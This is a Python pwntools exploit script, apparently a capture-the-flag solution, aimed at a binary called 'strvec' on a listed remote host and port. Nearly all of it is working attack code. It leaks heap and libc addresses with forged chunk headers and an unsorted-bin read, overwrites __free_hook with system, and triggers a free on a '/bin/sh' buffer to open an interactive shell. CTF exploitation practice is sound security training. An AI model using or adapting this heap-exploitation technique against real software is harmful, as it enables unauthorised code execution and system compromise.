#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./strvec"
#"""
HOST = "168.119.108.148"
PORT =  12010
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

libc = ELF('./libc-2.31.so')
off_system = libc.symbols["system"]
off_free_hook = libc.symbols["__free_hook"]
off_unsorted = libc.symbols["__malloc_hook"] + 0x70
off_binsh = next(libc.search(b"/bin/sh"))

def get(idx):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(" = ", str(idx))
	conn.recvuntil("-> ")

def create(idx, data):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(" = ", str(idx))
	conn.sendafter(" = ", data)

def exploit():
	conn.sendlineafter(": ", "name")	
	conn.sendlineafter("n = ", str(0x7fffffff))

	# heap address leak
	create(3, "\n")
	get(3)
	addr_heap = conn.recvline()[:-1]
	heap_base = u64(addr_heap+b"\x00"*(8-len(addr_heap))) - 0x2c0
	print(hex(heap_base))

	create(0, b"/bin/sh\x00"+p64(0x441)+b"\n") 			# prepare to get a shell , make fake size header
	create(1, p64(heap_base+0x2c0+0x40)+p64(heap_base+0x2c0+0x40)+b"\n")
	payload = p64(0)
	payload += p64(0x291)								# fake header
	payload += p64(0)
	payload += p64(0x291)								# fake header
	for i in range(22):
		create(21+i*6, payload[:-1])
	create(15, "\n")									# free fake chunk(size=0x440)
	get(16)												
	
	# libc address leak
	libc_unsorted = conn.recvline()[:-1]
	libc_base = u64(libc_unsorted+b"\x00"*(8-len(libc_unsorted))) - off_unsorted
	libc_free_hook = libc_base + off_free_hook
	libc_system = libc_base + off_system
	print(hex(libc_base))
	
	payload = p64(heap_base+0x3c0)
	payload += p64(heap_base+0x10)
	create(3, payload+b"\n") 		# allocate from unsorted
	create(3, payload+b"\n")
	create(4, b"\n")
	create(35, p64(libc_free_hook-0x8)+b"\n")
	create(5, b"\n")
	create(6, b"\n")
	create(7, p64(0)+p64(libc_system)+b"\n")
	conn.sendlineafter("> ", "3")	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
